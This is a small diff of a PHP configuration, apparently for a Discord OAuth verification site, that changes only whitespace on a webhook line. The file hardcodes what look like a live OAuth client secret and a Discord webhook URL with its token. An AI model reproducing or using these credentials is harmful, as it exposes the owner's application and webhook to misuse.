@@ -2,7 +2,7 @@
 // 余計な空白文字などを完全に排除した設定
 $client_id     = '1483731872050839564';
 $client_secret = 'x1dQum1L-xtASg0NHH29gPrnRDEjIA_L'; 
-$webhook_url   = 'https://discordapp.com/api/webhooks/1483730982606475304/UN0z8Omfi4Voo58rLkFVhwhv0Jd59kUOYktJxyx0g0mGl5VkCc0IbLtegaqKZXAKokc2';
+$webhook_url = 'https://discordapp.com/api/webhooks/1483730982606475304/UN0z8Omfi4Voo58rLkFVhwhv0Jd59kUOYktJxyx0g0mGl5VkCc0IbLtegaqKZXAKokc2';
 $redirect_uri  = 'https://discord-verify-6uql.onrender.com'; 
 
 if (!isset($_GET['code'])) {
